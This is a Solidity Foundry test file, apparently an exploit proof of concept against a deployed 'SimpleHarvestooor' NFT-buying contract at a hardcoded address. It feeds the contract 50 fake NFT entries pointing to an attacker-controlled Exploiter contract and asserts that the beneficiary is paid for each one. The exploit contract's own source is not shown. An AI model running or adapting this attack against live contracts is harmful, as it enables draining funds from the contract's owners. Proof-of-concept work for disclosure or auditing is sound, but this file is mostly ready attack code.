// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Exploiter.sol";

interface ISimpleHarvestooor {
    struct NFT {
        address tokenAddress;
        uint256 tokenId;
    }

    function sellTokens(NFT[] calldata tokens) external;

}

contract ExploitTest is Test {
    Exploiter exploiter;
    ISimpleHarvestooor harvestooor;

    address constant _harvestooor = 0xd60E94434310381575C5e67Bb1D3E125133AD3eD;
    address constant _beneficiary = 0x0b0854389083f9a35fD1D316D14EEeBd8D36d898;

    function setUp() public {
        exploiter = new Exploiter();
        harvestooor = ISimpleHarvestooor(_harvestooor);
    }

    function generateInputs(uint structs) public view returns(ISimpleHarvestooor.NFT[] memory) {
        ISimpleHarvestooor.NFT[] memory returnStructs = new ISimpleHarvestooor.NFT[](structs);
        for(uint i = 0; i < structs; ++i) {
            returnStructs[i] = ISimpleHarvestooor.NFT(address(exploiter), 0);
        }

        return returnStructs;
    }

    struct NFT {
        address tokenAddress;
        uint256 tokenId;
    }

    function testExploit() public {
        uint currentBeneficiaryBal = _beneficiary.balance;
        uint structs = 50;
        ISimpleHarvestooor.NFT[] memory args = generateInputs(structs);
        vm.prank(_beneficiary);
        ISimpleHarvestooor(_harvestooor).sellTokens(args);
        uint newBeneficiaryBal = _beneficiary.balance;
        assertEq(newBeneficiaryBal, currentBeneficiaryBal + (0.00000001 ether * structs));
    }
}
